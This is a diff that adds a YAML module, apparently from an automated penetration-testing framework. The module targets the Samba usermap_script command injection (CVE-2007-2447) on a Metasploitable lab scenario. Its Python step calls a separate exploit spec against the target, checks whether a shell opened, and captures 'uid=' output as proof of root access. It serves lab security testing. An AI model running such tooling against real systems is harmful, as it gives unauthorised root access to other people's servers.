@@ -1,0 +1,35 @@
+name: MS2 Samba usermap_script RCE
+description: >
+  Samba username map script command injection (CVE-2007-2447): a crafted SMB logon name runs a command as root.
+  Delegates to the framework's verified exploit spec (exploits/samba_usermap.yaml)
+  through run_spec, which drives the persistent target session.
+platforms:
+- linux
+scenario: metasploitable
+vector: samba_usermap
+mitre: T1210
+trigger:
+- netbios-ssn
+- microsoft-ds
+steps:
+- kind: lazymode
+  lang: python
+  timeout: 240
+  run: |
+    import re
+
+    from modules.atomic_exploit_bridge import load_all, run_spec
+
+    result = {"target": target, "vector": "samba_usermap"}
+    spec = load_all().get("samba_usermap")
+    if spec is None:
+        result["session_opened"] = False
+        result["error"] = "exploit spec samba_usermap not found in exploits/"
+    else:
+        outcome = run_spec(spec, rhost=target)
+        blob = outcome.get("output") or ""
+        match = re.search(r"uid=\d+\([^)]*\)[^\n]*", blob)
+        result["cve"] = spec.cve
+        result["session_opened"] = bool(outcome.get("shell"))
+        result["success"] = bool(outcome.get("success"))
+        result["proof"] = (match.group(0).strip() if match else blob[-300:].strip()) or "(no proof)"
